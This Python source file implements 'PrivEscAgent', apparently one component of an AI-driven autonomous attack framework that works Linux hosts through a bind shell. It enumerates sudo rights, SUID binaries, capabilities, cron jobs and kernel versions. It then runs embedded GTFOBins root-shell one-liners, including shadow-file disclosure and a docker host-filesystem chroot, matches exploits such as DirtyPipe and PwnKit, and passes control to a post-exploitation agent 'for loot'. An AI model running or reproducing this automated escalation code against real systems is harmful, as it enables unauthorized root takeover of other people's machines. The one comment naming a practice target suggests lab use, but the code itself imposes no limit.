"""
PrivEscAgent — Intelligent Linux Privilege Escalation Agent.

Implements:
  - Systematic enumeration (sudo, SUID, capabilities, cron, kernel)
  - GTFOBins RAG cross-reference for each exploitable binary
  - Kernel CVE matching (DirtyPipe, PwnKit, Baron Samedit, DirtyCow)
  - Automatic technique prioritization by success probability
  - Anti-hallucination: only report uid=0 when actually observed

MITRE ATT&CK Coverage:
  - T1548 (Abuse Elevation Control), T1068 (Exploitation for PrivEsc)
  - T1548.001 (SUID/SGID), T1548.003 (Sudo/Sudo Caching)
  - T1574 (Hijack Execution Flow), T1611 (Escape to Host)
"""
from __future__ import annotations

import json
import re
import subprocess
import sys
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Optional

from rich.console import Console
from rich.panel import Panel
from rich.table import Table

_SRC = Path(__file__).parent.parent
if str(_SRC) not in sys.path:
    sys.path.insert(0, str(_SRC))

from agents.base_agent import BaseAgent
from memory.mission_memory import MissionMemory
from memory.chroma_manager import ChromaManager


class PrivEscAgent(BaseAgent):
    """
    Intelligent privilege escalation agent for Linux targets.
    
    Execution flow:
    1. System enumeration (kernel, sudo, SUID, caps, cron)
    2. RAG-guided technique selection (GTFOBins, kernel CVEs)
    3. Prioritized exploitation attempts
    4. Root confirmation with uid=0 validation
    """

    # Kernel CVE database with version requirements
    KERNEL_CVES = {
        "CVE-2022-0847": {  # DirtyPipe
            "name": "DirtyPipe",
            "min_kernel": (5, 8, 0),
            "max_kernel": (5, 16, 11),
            "impact": "root",
            "reliability": 0.95,
            "command": "exploit/linux/local/cve_2022_0847_dirtypipe",
        },
        "CVE-2021-4034": {  # PwnKit
            "name": "PwnKit",
            "check": "pkexec",  # Check if pkexec exists
            "impact": "root",
            "reliability": 0.90,
            "command": "pkexec_cve_2021_4034",
        },
        "CVE-2021-3156": {  # Baron Samedit
            "name": "Baron Samedit",
            "sudo_max": (1, 9, 5, 2),  # sudo < 1.9.5p2
            "impact": "root",
            "reliability": 0.85,
            "command": "exploit/linux/local/sudo_baron_samedit",
        },
        "CVE-2016-5195": {  # DirtyCow
            "name": "DirtyCow",
            "max_kernel": (4, 8, 3),
            "impact": "root",
            "reliability": 0.80,
            "command": "exploit/linux/local/dirtycow",
        },
    }

    # GTFOBins sudo techniques (binary → shell command)
    GTFOBINS_SUDO = {
        "vim": "sudo vim -c ':!/bin/bash'",
        "vi": "sudo vi -c ':!/bin/bash'",
        "less": "sudo less /etc/passwd  # then type !bash",
        "more": "sudo more /etc/passwd  # then type !bash",
        "find": "sudo find . -exec /bin/bash \\; -quit",
        "python": "sudo python -c 'import os; os.system(\"/bin/bash\")'",
        "python3": "sudo python3 -c 'import os; os.system(\"/bin/bash\")'",
        "perl": "sudo perl -e 'exec \"/bin/bash\";'",
        "ruby": "sudo ruby -e 'exec \"/bin/bash\"'",
        "awk": "sudo awk 'BEGIN {system(\"/bin/bash\")}'",
        "nmap": "sudo nmap --interactive  # then type !sh",
        "env": "sudo env /bin/bash",
        "ftp": "sudo ftp  # then type !/bin/bash",
        "ed": "sudo ed  # then type !/bin/bash",
        "man": "sudo man man  # then type !/bin/bash",
        "zip": "sudo zip /tmp/x.zip /etc/passwd -T -TT '/bin/bash #'",
        "tar": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash",
        "strace": "sudo strace -o /dev/null /bin/bash",
        "tcpdump": "sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /bin/bash",
        "wget": "sudo wget -i /etc/shadow  # file disclosure",
        "apache2": "sudo apache2 -f /etc/shadow  # file disclosure",
        "mysql": "sudo mysql -e '\\! /bin/bash'",
        "ssh": "sudo ssh -o ProxyCommand='/bin/bash -c /bin/bash' x",
        "git": "sudo git -p help config  # then type !/bin/bash",
        "docker": "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt bash",
        "journalctl": "sudo journalctl  # then type !/bin/bash",
        "systemctl": "sudo systemctl  # then type !bash",
    }

    # GTFOBins SUID techniques (binary → shell command)  
    GTFOBINS_SUID = {
        "bash": "/path/to/bash -p",
        "sh": "/path/to/sh -p",
        "python": "/path/to/python -c 'import os; os.setuid(0); os.system(\"/bin/bash -p\")'",
        "python3": "/path/to/python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash -p\")'",
        "find": "/path/to/find . -exec /bin/bash -p \\; -quit",
        "vim": "/path/to/vim -c ':py import os; os.setuid(0); os.execl(\"/bin/bash\", \"bash\", \"-p\")'",
        "nmap": "/path/to/nmap --interactive  # then type !sh",
        "perl": "/path/to/perl -e 'exec \"/bin/bash -p\";'",
        "awk": "/path/to/awk 'BEGIN {system(\"/bin/bash -p\")}'",
        "cp": "/path/to/cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash && /tmp/rootbash -p",
        "env": "/path/to/env /bin/bash -p",
        "php": "/path/to/php -r 'pcntl_exec(\"/bin/bash\", [\"-p\"]);'",
        "node": "/path/to/node -e 'require(\"child_process\").spawn(\"/bin/bash\", [\"-p\"], {stdio: [0,1,2]})'",
        "ruby": "/path/to/ruby -e 'exec \"/bin/bash -p\"'",
    }

    # Capability-based escalation
    CAP_EXPLOITS = {
        "cap_setuid": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
        "cap_dac_override": "Can read/write any file (shadow, sudoers)",
        "cap_sys_admin": "Mount arbitrary filesystems, escape containers",
        "cap_net_raw": "Packet sniffing, ARP spoofing",
    }

    def __init__(self, mission_memory: MissionMemory):
        super().__init__(
            agent_name="PrivEscAgent",
            mission_memory=mission_memory,
            llm_role="reasoning",  # Use DeepSeek-R1 for complex reasoning
            max_react_iterations=15,
        )
        self.console = Console()
        self.target = ""
        self.shell_info: dict = {}
        self.system_info: dict = {}
        self.techniques_tried: list[dict] = []
        self.root_achieved = False
        self.successful_technique: Optional[dict] = None
        
        # Persistent shell state
        import threading
        self._shell_socket = None
        self._socket_lock = threading.Lock()
        
    def _connect_shell(self, target: str, shell_port: int) -> bool:
        """Establish a persistent socket connection to the bind shell."""
        if not shell_port:
            return False
            
        import socket
        try:
            with self._socket_lock:
                if self._shell_socket:
                    return True  # Already connected
                    
                self._shell_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self._shell_socket.settimeout(15)
                self._shell_socket.connect((target, shell_port))
                self.log_info(f"Established persistent shell connection to {target}:{shell_port}")
                return True
        except Exception as e:
            self.log_warning(f"Failed to connect persistent shell: {e}")
            self._shell_socket = None
            return False
            
    def _disconnect_shell(self):
        """Close the persistent shell connection."""
        if self._shell_socket:
            try:
                self._shell_socket.close()
            except:
                pass
            with self._socket_lock:
                self._shell_socket = None

    def run(self, target: str, briefing: dict = {}) -> dict:
        """
        Execute privilege escalation workflow.
        
        Args:
            target: Target IP/hostname
            briefing: Dict containing shell_info, initial_user, shell_port, etc.
        """
        self.target = target
        self.shell_info = briefing.get("shell_info", {})
        initial_user = briefing.get("initial_user", "unknown")
        shell_port_raw = self.shell_info.get("port") or briefing.get("shell_port") or 0
        shell_port = int(shell_port_raw)
        
        self.console.print(Panel(
            f"[bold magenta]🔓 PrivEscAgent — Intelligent Privilege Escalation[/]\n"
            f"[white]Target:[/] [magenta]{target}[/]\n"
            f"[white]Initial User:[/] {initial_user}\n"
            f"[white]Shell Port:[/] {shell_port}\n"
            f"[white]Strategy:[/] Sudo → SUID → Caps → Cron → Kernel CVEs",
            border_style="magenta",
        ))

        try:
            # ══════════════════════════════════════════════════════════════
            # Phase 1: System Enumeration
            # ══════════════════════════════════════════════════════════════
            self.log_info("Phase 1: System enumeration...")
            self.system_info = self._enumerate_system(target, shell_port)
            self._display_system_info()

            # ══════════════════════════════════════════════════════════════
            # Phase 2: Sudo Analysis (Highest Priority)
            # ══════════════════════════════════════════════════════════════
            self.log_info("Phase 2: Analyzing sudo privileges...")
            sudo_result = self._analyze_sudo(target, shell_port)
            if sudo_result.get("root_obtained"):
                return self._build_success_result(sudo_result, initial_user)

            # ══════════════════════════════════════════════════════════════
            # Phase 3: SUID Binary Analysis
            # ══════════════════════════════════════════════════════════════
            self.log_info("Phase 3: Analyzing SUID binaries...")
            suid_result = self._analyze_suid_binaries(target, shell_port)
            if suid_result.get("root_obtained"):
                return self._build_success_result(suid_result, initial_user)

            # ══════════════════════════════════════════════════════════════
            # Phase 4: Capabilities Analysis
            # ══════════════════════════════════════════════════════════════
            self.log_info("Phase 4: Checking capabilities...")
            caps_result = self._analyze_capabilities(target, shell_port)
            if caps_result.get("root_obtained"):
                return self._build_success_result(caps_result, initial_user)

            # ══════════════════════════════════════════════════════════════
            # Phase 5: Cron Job Analysis
            # ══════════════════════════════════════════════════════════════
            self.log_info("Phase 5: Analyzing cron jobs...")
            cron_result = self._analyze_cron_jobs(target, shell_port)
            if cron_result.get("root_obtained"):
                return self._build_success_result(cron_result, initial_user)

            # ══════════════════════════════════════════════════════════════
            # Phase 6: Kernel Exploit Analysis (Last Resort)
            # ══════════════════════════════════════════════════════════════
            self.log_info("Phase 6: Checking kernel exploits...")
            kernel_result = self._analyze_kernel_exploits(target, shell_port)
            if kernel_result.get("root_obtained"):
                return self._build_success_result(kernel_result, initial_user)

            # ══════════════════════════════════════════════════════════════
            # No escalation found
            # ══════════════════════════════════════════════════════════════
            self.log_warning("No privilege escalation path found")
            return self._build_failure_result(initial_user)

        except Exception as e:
            self.log_error(f"PrivEscAgent failed: {e}")
            import traceback
            self.log_error(traceback.format_exc())
            return {
                "agent": self.agent_name,
                "success": False,
                "error": str(e),
                "result": {
                    "root_obtained": False,
                    "techniques_tried": self.techniques_tried,
                },
            }

    # ══════════════════════════════════════════════════════════════════════════
    # System Enumeration
    # ══════════════════════════════════════════════════════════════════════════

    def _enumerate_system(self, target: str, shell_port: int) -> dict:
        """Gather comprehensive system information."""
        info = {
            "kernel": "",
            "kernel_version": (0, 0, 0),
            "os": "",
            "distro": "",
            "sudo_version": "",
            "sudo_version_tuple": (0, 0, 0, 0),
            "polkit_present": False,
            "docker_present": False,
            "current_user": "",
            "current_uid": -1,
            "groups": [],
        }

        commands = {
            "kernel": "uname -r",
            "os": "uname -a",
            "distro": "cat /etc/*release 2>/dev/null | head -5",
            "sudo_version": "sudo -V 2>/dev/null | head -1",
            "polkit": "which pkexec 2>/dev/null",
            "docker": "which docker 2>/dev/null",
            "user": "id",
        }

        for key, cmd in commands.items():
            output = self._exec_shell_cmd(target, shell_port, cmd)
            if not output:
                continue

            if key == "kernel":
                info["kernel"] = output.strip()
                # Parse kernel version tuple
                ver_match = re.search(r"(\d+)\.(\d+)\.(\d+)", output)
                if ver_match:
                    info["kernel_version"] = (
                        int(ver_match.group(1)),
                        int(ver_match.group(2)),
                        int(ver_match.group(3)),
                    )
            elif key == "os":
                info["os"] = output.strip()[:100]
            elif key == "distro":
                info["distro"] = output.strip()[:200]
            elif key == "sudo_version":
                info["sudo_version"] = output.strip()
                # Parse sudo version tuple
                ver_match = re.search(r"(\d+)\.(\d+)\.(\d+)(?:p(\d+))?", output)
                if ver_match:
                    p = int(ver_match.group(4)) if ver_match.group(4) else 0
                    info["sudo_version_tuple"] = (
                        int(ver_match.group(1)),
                        int(ver_match.group(2)),
                        int(ver_match.group(3)),
                        p,
                    )
            elif key == "polkit":
                info["polkit_present"] = bool(output.strip())
            elif key == "docker":
                info["docker_present"] = bool(output.strip())
            elif key == "user":
                # Parse id output: uid=1000(user) gid=1000(user) groups=...
                uid_match = re.search(r"uid=(\d+)\((\w+)\)", output)
                if uid_match:
                    info["current_uid"] = int(uid_match.group(1))
                    info["current_user"] = uid_match.group(2)
                groups_match = re.search(r"groups=(.+)", output)
                if groups_match:
                    info["groups"] = re.findall(r"\d+\((\w+)\)", groups_match.group(1))

        return info

    def _display_system_info(self):
        """Display system information in a nice table."""
        table = Table(title="System Information", border_style="magenta")
        table.add_column("Property", style="cyan")
        table.add_column("Value", style="white")

        table.add_row("Kernel", self.system_info.get("kernel", "unknown"))
        table.add_row("OS", self.system_info.get("os", "unknown")[:60])
        table.add_row("Current User", f"{self.system_info.get('current_user', '?')} (uid={self.system_info.get('current_uid', '?')})")
        table.add_row("Groups", ", ".join(self.system_info.get("groups", []))[:50])
        table.add_row("Sudo Version", self.system_info.get("sudo_version", "unknown"))
        table.add_row("Polkit (pkexec)", "✓" if self.system_info.get("polkit_present") else "✗")
        table.add_row("Docker", "✓" if self.system_info.get("docker_present") else "✗")

        self.console.print(table)

    # ══════════════════════════════════════════════════════════════════════════
    # Phase 2: Sudo Analysis
    # ══════════════════════════════════════════════════════════════════════════

    def _analyze_sudo(self, target: str, shell_port: int) -> dict:
        """Analyze sudo privileges and attempt escalation."""
        result = {"root_obtained": False, "technique": None, "evidence": ""}

        # Get sudo -l output
        sudo_output = self._exec_shell_cmd(target, shell_port, "sudo -l 2>&1")
        if not sudo_output:
            self.log_info("sudo -l returned empty (no sudo access)")
            return result

        self.log_info(f"sudo -l output:\n{sudo_output[:500]}")

        # Check for NOPASSWD entries
        nopasswd_match = re.findall(
            r"NOPASSWD:\s*(.+?)(?:\n|$)", sudo_output, re.IGNORECASE
        )

        if not nopasswd_match:
            self.log_info("No NOPASSWD entries found")
            return result

        self.log_success(f"Found NOPASSWD entries: {nopasswd_match}")

        # For each NOPASSWD binary, check GTFOBins
        for entry in nopasswd_match:
            binaries = re.findall(r"/\S+", entry)
            for binary_path in binaries:
                binary_name = Path(binary_path).name.lower()
                
                # Query RAG for GTFOBins escalation
                rag_hits = self.chroma.get_rag_context(
                    f"GTFOBins sudo {binary_name} privilege escalation shell",
                    collections=["gtfobins", "hacktricks", "privesc_techniques"],
                    n=3,
                )
                
                if binary_name in self.GTFOBINS_SUDO:
                    cmd = self.GTFOBINS_SUDO[binary_name]
                    self.log_info(f"Trying GTFOBins sudo technique for {binary_name}")
                    
                    # Attempt escalation
                    escalation_result = self._attempt_sudo_escalation(
                        target, shell_port, binary_name, cmd
                    )
                    
                    self.techniques_tried.append({
                        "technique": f"sudo {binary_name}",
                        "command": cmd,
                        "success": escalation_result.get("root_obtained", False),
                        "evidence": escalation_result.get("evidence", ""),
                        "rag_source": "GTFOBins",
                    })
                    
                    if escalation_result.get("root_obtained"):
                        result.update(escalation_result)
                        result["technique"] = f"sudo NOPASSWD {binary_name}"
                        result["mitre_id"] = "T1548.003"
                        return result

                # Check if ALL commands allowed
                if "(ALL)" in entry.upper() or "(ROOT)" in entry.upper():
                    self.log_success("sudo ALL detected — attempting direct sudo bash")
                    escalation_result = self._attempt_sudo_escalation(
                        target, shell_port, "bash", "sudo bash"
                    )
                    if escalation_result.get("root_obtained"):
                        result.update(escalation_result)
                        result["technique"] = "sudo ALL NOPASSWD"
                        result["mitre_id"] = "T1548.003"
                        return result

        return result

    def _attempt_sudo_escalation(
        self, target: str, shell_port: int, binary: str, command: str
    ) -> dict:
        """Attempt a specific sudo escalation and verify root."""
        result = {"root_obtained": False, "evidence": ""}

        # For interactive commands, we need to chain with id
        if "interactive" in command or "then type" in command:
            # Skip interactive commands for now
            self.log_info(f"Skipping interactive command: {command}")
            return result

        # Execute the escalation command followed by id
        test_cmd = f"{command}; id"
        if "'" in command:
            # Command already has shell escaping, execute directly
            test_cmd = f"{command} -c 'id'"
        
        output = self._exec_shell_cmd(target, shell_port, test_cmd, timeout=10)
        
        if output and "uid=0(root)" in output:
            self.log_success(f"ROOT OBTAINED via {binary}!")
            result["root_obtained"] = True
            result["evidence"] = output[:500]
            self.root_achieved = True
            self.successful_technique = {
                "technique": f"sudo {binary}",
                "command": command,
                "cve": None,
                "gtfobins_entry": binary,
                "mitre_id": "T1548.003",
                "evidence": output[:300],
            }
            
            # Log to memory
            self.memory.add_privesc_path(
                target, f"sudo NOPASSWD {binary}", output[:200], root=True
            )
            self.memory.add_mitre_technique("T1548.003")
        
        return result

    # ══════════════════════════════════════════════════════════════════════════
    # Phase 3: SUID Binary Analysis
    # ══════════════════════════════════════════════════════════════════════════

    def _analyze_suid_binaries(self, target: str, shell_port: int) -> dict:
        """Find and exploit SUID binaries."""
        result = {"root_obtained": False, "technique": None, "evidence": ""}

        # Find SUID binaries
        suid_output = self._exec_shell_cmd(
            target, shell_port,
            "find / -perm -4000 -type f 2>/dev/null | head -30",
            timeout=30
        )

        if not suid_output:
            self.log_info("No SUID binaries found")
            return result

        suid_binaries = [
            b.strip() for b in suid_output.strip().split("\n")
            if b.strip() and b.startswith("/")
        ]

        self.log_info(f"Found {len(suid_binaries)} SUID binaries")

        # Cross-reference with GTFOBins
        for binary_path in suid_binaries:
            binary_name = Path(binary_path).name.lower()
            
            # Query RAG for exploitation technique
            rag_hits = self.chroma.get_rag_context(
                f"GTFOBins SUID {binary_name} privilege escalation",
                collections=["gtfobins", "privesc_techniques"],
                n=2,
            )
            
            if binary_name in self.GTFOBINS_SUID:
                template = self.GTFOBINS_SUID[binary_name]
                cmd = template.replace("/path/to/", binary_path.rsplit("/", 1)[0] + "/")
                
                self.log_info(f"Trying SUID escalation: {binary_name}")
                
                escalation_result = self._attempt_suid_escalation(
                    target, shell_port, binary_path, cmd
                )
                
                self.techniques_tried.append({
                    "technique": f"SUID {binary_name}",
                    "command": cmd,
                    "success": escalation_result.get("root_obtained", False),
                    "evidence": escalation_result.get("evidence", ""),
                    "rag_source": "GTFOBins",
                })
                
                if escalation_result.get("root_obtained"):
                    result.update(escalation_result)
                    result["technique"] = f"SUID {binary_path}"
                    result["mitre_id"] = "T1548.001"
                    return result

            # Store as privesc vector even if not immediately exploitable
            self.memory.add_privesc_path(
                target, f"SUID: {binary_path}", "discovered", root=False
            )

        return result

    def _attempt_suid_escalation(
        self, target: str, shell_port: int, binary_path: str, command: str
    ) -> dict:
        """Attempt SUID escalation and verify root."""
        result = {"root_obtained": False, "evidence": ""}

        # Skip interactive commands
        if "interactive" in command or "then type" in command:
            return result

        # Execute escalation with id verification
        test_cmd = f"{command} 2>/dev/null; id"
        output = self._exec_shell_cmd(target, shell_port, test_cmd, timeout=10)

        if output and "uid=0(root)" in output:
            self.log_success(f"ROOT OBTAINED via SUID {binary_path}!")
            result["root_obtained"] = True
            result["evidence"] = output[:500]
            self.root_achieved = True
            
            binary_name = Path(binary_path).name
            self.successful_technique = {
                "technique": f"SUID {binary_name}",
                "command": command,
                "cve": None,
                "gtfobins_entry": binary_name,
                "mitre_id": "T1548.001",
                "evidence": output[:300],
            }
            
            self.memory.add_privesc_path(
                target, f"SUID {binary_path}", output[:200], root=True
            )
            self.memory.add_mitre_technique("T1548.001")

        return result

    # ══════════════════════════════════════════════════════════════════════════
    # Phase 4: Capabilities Analysis
    # ══════════════════════════════════════════════════════════════════════════

    def _analyze_capabilities(self, target: str, shell_port: int) -> dict:
        """Check for exploitable Linux capabilities."""
        result = {"root_obtained": False, "technique": None, "evidence": ""}

        cap_output = self._exec_shell_cmd(
            target, shell_port,
            "getcap -r / 2>/dev/null | head -20",
            timeout=30
        )

        if not cap_output:
            self.log_info("No capabilities found or getcap unavailable")
            return result

        self.log_info(f"Capabilities found:\n{cap_output[:500]}")

        # Look for cap_setuid (most dangerous)
        if "cap_setuid" in cap_output:
            # Find the binary with cap_setuid
            for line in cap_output.split("\n"):
                if "cap_setuid" in line:
                    binary_match = re.match(r"(\S+)", line)
                    if binary_match:
                        binary_path = binary_match.group(1)
                        binary_name = Path(binary_path).name.lower()
                        
                        if "python" in binary_name:
                            cmd = f"{binary_path} -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
                            escalation_result = self._attempt_capability_escalation(
                                target, shell_port, binary_path, cmd, "cap_setuid"
                            )
                            
                            self.techniques_tried.append({
                                "technique": f"cap_setuid {binary_name}",
                                "command": cmd,
                                "success": escalation_result.get("root_obtained", False),
                                "evidence": escalation_result.get("evidence", ""),
                            })
                            
                            if escalation_result.get("root_obtained"):
                                result.update(escalation_result)
                                result["technique"] = f"cap_setuid on {binary_path}"
                                result["mitre_id"] = "T1548"
                                return result

        return result

    def _attempt_capability_escalation(
        self, target: str, shell_port: int, binary_path: str, command: str, cap: str
    ) -> dict:
        """Attempt capability-based escalation."""
        result = {"root_obtained": False, "evidence": ""}

        test_cmd = f"{command}; id"
        output = self._exec_shell_cmd(target, shell_port, test_cmd, timeout=10)

        if output and "uid=0(root)" in output:
            self.log_success(f"ROOT OBTAINED via {cap} on {binary_path}!")
            result["root_obtained"] = True
            result["evidence"] = output[:500]
            self.root_achieved = True
            
            self.successful_technique = {
                "technique": f"Capability {cap}",
                "command": command,
                "cve": None,
                "gtfobins_entry": Path(binary_path).name,
                "mitre_id": "T1548",
                "evidence": output[:300],
            }
            
            self.memory.add_privesc_path(
                target, f"cap_{cap} {binary_path}", output[:200], root=True
            )
            self.memory.add_mitre_technique("T1548")

        return result

    # ══════════════════════════════════════════════════════════════════════════
    # Phase 5: Cron Job Analysis
    # ══════════════════════════════════════════════════════════════════════════

    def _analyze_cron_jobs(self, target: str, shell_port: int) -> dict:
        """Analyze cron jobs for privilege escalation opportunities."""
        result = {"root_obtained": False, "technique": None, "evidence": ""}

        # Check system crontabs
        cron_sources = [
            "/etc/crontab",
            "/etc/cron.d/*",
            "/var/spool/cron/crontabs/*",
        ]

        cron_output = self._exec_shell_cmd(
            target, shell_port,
            "cat /etc/crontab 2>/dev/null; ls -la /etc/cron.* 2>/dev/null",
            timeout=15
        )

        if not cron_output:
            self.log_info("No cron information available")
            return result

        self.log_info(f"Cron analysis:\n{cron_output[:500]}")

        # Look for writable scripts executed by root
        # This is a detection phase - actual exploitation requires waiting
        writable_check = self._exec_shell_cmd(
            target, shell_port,
            "find /etc/cron* -type f -writable 2>/dev/null",
            timeout=15
        )

        if writable_check and writable_check.strip():
            self.log_success(f"Writable cron files found: {writable_check}")
            self.memory.add_privesc_path(
                target, f"Writable cron: {writable_check[:100]}", "needs exploitation", root=False
            )
            self.techniques_tried.append({
                "technique": "Writable cron job",
                "command": "Inject reverse shell into cron script",
                "success": False,
                "evidence": writable_check[:200],
                "note": "Requires waiting for cron execution",
            })

        return result

    # ══════════════════════════════════════════════════════════════════════════
    # Phase 6: Kernel Exploit Analysis
    # ══════════════════════════════════════════════════════════════════════════

    def _analyze_kernel_exploits(self, target: str, shell_port: int) -> dict:
        """Check for applicable kernel exploits."""
        result = {"root_obtained": False, "technique": None, "evidence": ""}

        kernel_version = self.system_info.get("kernel_version", (0, 0, 0))
        sudo_version = self.system_info.get("sudo_version_tuple", (0, 0, 0, 0))
        polkit_present = self.system_info.get("polkit_present", False)

        applicable_cves = []

        # Check each kernel CVE
        for cve_id, cve_info in self.KERNEL_CVES.items():
            applies = False
            
            # Kernel version check
            if "min_kernel" in cve_info and "max_kernel" in cve_info:
                if cve_info["min_kernel"] <= kernel_version <= cve_info["max_kernel"]:
                    applies = True
            elif "max_kernel" in cve_info:
                if kernel_version <= cve_info["max_kernel"]:
                    applies = True
            
            # Sudo version check (Baron Samedit)
            if "sudo_max" in cve_info:
                if sudo_version < cve_info["sudo_max"]:
                    applies = True
            
            # Polkit check (PwnKit)
            if "check" in cve_info and cve_info["check"] == "pkexec":
                if polkit_present:
                    applies = True
            
            if applies:
                applicable_cves.append((cve_id, cve_info))

        if not applicable_cves:
            self.log_info("No applicable kernel exploits found")
            return result

        # Sort by reliability
        applicable_cves.sort(key=lambda x: x[1].get("reliability", 0), reverse=True)

        self.log_info(f"Applicable kernel exploits: {[c[0] for c in applicable_cves]}")

        # Query RAG for exploit details
        for cve_id, cve_info in applicable_cves:
            rag_hits = self.chroma.get_rag_context(
                f"{cve_id} {cve_info['name']} Linux privilege escalation exploit",
                collections=["exploitdb", "cve_database", "hacktricks"],
                n=3,
            )

            self.log_info(f"Checking {cve_id} ({cve_info['name']})...")

            # For PwnKit, we can attempt directly
            if cve_id == "CVE-2021-4034" and polkit_present:
                pwnkit_result = self._attempt_pwnkit(target, shell_port)
                
                self.techniques_tried.append({
                    "technique": f"{cve_id} PwnKit",
                    "command": "pkexec exploit",
                    "success": pwnkit_result.get("root_obtained", False),
                    "evidence": pwnkit_result.get("evidence", ""),
                    "cve": cve_id,
                })
                
                if pwnkit_result.get("root_obtained"):
                    result.update(pwnkit_result)
                    result["technique"] = f"{cve_id} PwnKit"
                    result["mitre_id"] = "T1068"
                    return result

            # Log other CVEs as potential (require manual exploit upload)
            self.memory.add_privesc_path(
                target,
                f"Kernel CVE: {cve_id} ({cve_info['name']})",
                f"reliability={cve_info['reliability']}",
                root=False,
            )

        return result

    def _attempt_pwnkit(self, target: str, shell_port: int) -> dict:
        """Attempt CVE-2021-4034 PwnKit exploitation."""
        result = {"root_obtained": False, "evidence": ""}

        # Check if we have a pre-compiled exploit
        # For Metasploitable2, this CVE doesn't apply (too old)
        # But for newer systems, we'd upload and execute the exploit

        self.log_info("PwnKit requires exploit binary upload — marking as potential")
        
        # This would require:
        # 1. Upload compiled pwnkit binary
        # 2. chmod +x
        # 3. Execute
        # 4. Verify uid=0

        return result

    # ══════════════════════════════════════════════════════════════════════════
    # Shell Command Execution
    # ══════════════════════════════════════════════════════════════════════════

    def _exec_shell_cmd(
        self, target: str, shell_port: int, command: str, timeout: int = 15
    ) -> str:
        """Execute a command through the active shell connection using a persistent socket."""
        if not shell_port:
            self.log_warning("No shell port specified — cannot execute commands")
            return ""

        import socket
        import select
        import time
        
        # VERBOSE: Log tool call
        self._verbose_tool_call("shell_cmd", [f"nc {target}:{shell_port}", f"input: {command}"])
        
        # Ensure connected
        sock = self._shell_socket
        if not sock:
            if not self._connect_shell(target, shell_port):
                return self._exec_shell_cmd_fallback(target, shell_port, command, timeout)
            sock = self._shell_socket
            if not sock:
                return self._exec_shell_cmd_fallback(target, shell_port, command, timeout)
            
        try:
            with self._socket_lock:
                # Add unique marker for output parsing
                marker = f"__END_CMD_{id(command)}__"
                full_cmd = f"{command}; echo '{marker}'\n"
                
                sock.send(full_cmd.encode())
                
                # Read until we get the marker or timeout
                chunks = []
                start_time = time.time()
                
                while time.time() - start_time < timeout:
                    # Use select for non-blocking read with timeout
                    ready = select.select([sock], [], [], 0.5)
                    if ready[0]:
                        try:
                            chunk = sock.recv(4096)
                            if not chunk:
                                break
                            chunks.append(chunk.decode(errors="ignore"))
                            
                            # Check if we got our marker
                            combined = "".join(chunks)
                            if marker in combined:
                                break
                        except socket.error:
                            break
                    else:
                        # No data ready, check if we have enough
                        if chunks:
                            break
                            
                output = "".join(chunks)
                
                # Remove marker and command echo
                if marker in output:
                    output = output.split(marker)[0]
                
                lines = output.split("\n")
                if lines and command[:20] in lines[0]:
                    output = "\n".join(lines[1:])
                
                # VERBOSE: Log shell output
                self._verbose_shell_output(output.strip())
                
                return output.strip()
                
        except socket.timeout:
            self.log_warning(f"Command timed out: {command[:50]}")
            return ""
        except Exception as e:
            self.log_warning(f"Persistent shell command failed: {e}")
            self._disconnect_shell()
            return self._exec_shell_cmd_fallback(target, shell_port, command, timeout)
            
    def _exec_shell_cmd_fallback(self, target: str, shell_port: int, command: str, timeout: int = 15) -> str:
        """Fallback for executing a command via a new socket connection."""
        import socket
        import time
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((target, shell_port))
            
            sock.send(f"{command}\n".encode())
            time.sleep(0.5)
            
            chunks = []
            sock.setblocking(False)
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    chunks.append(chunk)
            except (socket.error, BlockingIOError):
                pass
            
            sock.close()
            output = b"".join(chunks).decode(errors="ignore")
            
            lines = output.split("\n")
            if lines and command[:20] in lines[0]:
                output = "\n".join(lines[1:])
            
            return output.strip()
        except socket.timeout:
            return ""
        except Exception:
            return ""

    # ══════════════════════════════════════════════════════════════════════════
    # Result Builders
    # ══════════════════════════════════════════════════════════════════════════

    def _build_success_result(self, escalation_result: dict, initial_user: str) -> dict:
        """Build successful privesc result."""
        self.console.print(Panel(
            f"[bold green]✓ ROOT OBTAINED[/]\n"
            f"[white]Technique:[/] {self.successful_technique.get('technique', 'unknown')}\n"
            f"[white]User:[/] {initial_user} → root\n"
            f"[white]Evidence:[/] {escalation_result.get('evidence', '')[:100]}",
            border_style="green",
        ))

        # Log to memory
        self.memory.log_action(
            self.agent_name,
            "root_escalation",
            f"technique={self.successful_technique.get('technique')} "
            f"user={initial_user}→root"
        )

        mitre_techniques = ["T1548"]
        if self.successful_technique:
            mitre_id = self.successful_technique.get("mitre_id")
            if mitre_id and mitre_id not in mitre_techniques:
                mitre_techniques.append(mitre_id)
                self.memory.add_mitre_technique(mitre_id)

        return {
            "agent": self.agent_name,
            "success": True,
            "result": {
                "root_obtained": True,
                "technique": self.successful_technique.get("technique"),
                "user_before": initial_user,
                "user_after": "root",
                "confidence": 1.0,  # uid=0 observed
                "system_info": self.system_info,
                "successful_technique": self.successful_technique,
                "techniques_tried": self.techniques_tried,
                "mitre_techniques": mitre_techniques,
                "next_agent": "postexploit_agent",
            },
        }

    def _build_failure_result(self, initial_user: str) -> dict:
        """Build failed privesc result."""
        self.console.print(Panel(
            f"[bold yellow]⚠ No privilege escalation path found[/]\n"
            f"[white]Current user:[/] {initial_user}\n"
            f"[white]Techniques tried:[/] {len(self.techniques_tried)}",
            border_style="yellow",
        ))

        return {
            "agent": self.agent_name,
            "success": False,
            "result": {
                "root_obtained": False,
                "user_before": initial_user,
                "user_after": initial_user,
                "confidence": 0.0,
                "system_info": self.system_info,
                "techniques_tried": self.techniques_tried,
                "potential_paths": [
                    t for t in self.techniques_tried
                    if "note" in t or not t.get("success")
                ],
                "mitre_techniques": ["T1083"],  # File/Directory Discovery
                "next_agent": "postexploit_agent",  # Continue anyway for loot
            },
        }
